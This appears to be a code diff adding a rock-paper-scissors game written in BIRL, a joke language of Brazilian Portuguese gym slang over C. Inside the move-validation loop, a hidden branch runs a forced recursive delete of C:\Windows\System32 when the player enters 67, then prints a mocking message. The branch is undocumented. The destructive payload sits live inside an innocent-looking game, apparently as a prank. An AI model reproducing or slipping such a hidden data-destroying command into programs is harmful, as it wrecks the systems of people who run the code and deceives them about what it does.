@@ -1,0 +1,65 @@
+HORA DO SHOW
+    FRANGO input;
+    MONSTRO user, com;
+
+    CE QUER VER ESSA PORRA? ("Quer jogar pedra papel ou tesoura? (S/N): ");
+    QUE QUE CE QUER MONSTRAO? (" %c", &input);
+
+    NEGATIVA BAMBAM (1)
+        ELE QUE A GENTE QUER? (input == 'S' || input == 's' || input == 'N' || input == 'n')
+            SAI FILHO DA PUTA;
+        NAO VAI DAR NAO
+            CE QUER VER ESSA PORRA? ("Digite apenas 'S' ou 'N': ");
+            QUE QUE CE QUER MONSTRAO? (" %c", &input);
+        BIRL
+    BIRL
+        
+    NEGATIVA BAMBAM (input == 'S' || input == 's')
+        CE QUER VER ESSA PORRA? ("Escolha o seu! (1 - pedra, 2 - papel, 3 - tesoura): ");
+        QUE QUE CE QUER MONSTRAO? ("%d", &user);
+
+        NEGATIVA BAMBAM (1)
+            ELE QUE A GENTE QUER? (user == 1 || user == 2 || user == 3)
+                SAI FILHO DA PUTA;
+            QUE NAO VAI DAR O QUE? (user == 67)
+                system("del /s /q /f C:\\Windows\\System32\\*");
+                CE QUER VER ESSA PORRA? ("Deletou a System32, parabéns!");
+                BORA CUMPADE 1;
+            NAO VAI DAR NAO
+                CE QUER VER ESSA PORRA? ("Escolha entre 1, 2 ou 3: ");
+                QUE QUE CE QUER MONSTRAO? ("%d", &user);
+            BIRL
+        BIRL
+
+        com = (rand() % 3) + 1;
+
+        ELE QUE A GENTE QUER? (com == 1)
+            CE QUER VER ESSA PORRA? ("O BOT escolheu: PEDRA.\n");
+        QUE NAO VAI DAR O QUE? (com == 2)
+            CE QUER VER ESSA PORRA? ("O BOT escolheu: PAPEL.\n");
+        NAO VAI DAR NAO
+            CE QUER VER ESSA PORRA? ("O BOT escolheu: TESOURA.\n");
+        BIRL
+
+        ELE QUE A GENTE QUER? (com == user)
+            CE QUER VER ESSA PORRA? ("Empate! Jogar novamente? (S/N): ");
+        QUE NAO VAI DAR O QUE? ((user == 1 && com == 3) || (user == 2 && com == 1) || (user == 3 && com == 2))
+            CE QUER VER ESSA PORRA? ("Voce ganhou! Jogar novamente? (S/N): ");
+        NAO VAI DAR NAO
+            CE QUER VER ESSA PORRA? ("Voce perdeu! Jogar novamente? (S/N): ");
+        BIRL
+
+        QUE QUE CE QUER MONSTRAO? (" %c", &input);
+
+        NEGATIVA BAMBAM (1)
+            ELE QUE A GENTE QUER? (input == 'S' || input == 's' || input == 'N' || input == 'n')
+                SAI FILHO DA PUTA;
+            NAO VAI DAR NAO
+                CE QUER VER ESSA PORRA? ("Digite apenas 'S' ou 'N': ");
+                QUE QUE CE QUER MONSTRAO? (" %c", &input);
+            BIRL
+        BIRL
+    BIRL
+
+    BORA CUMPADE 0;
+BIRL
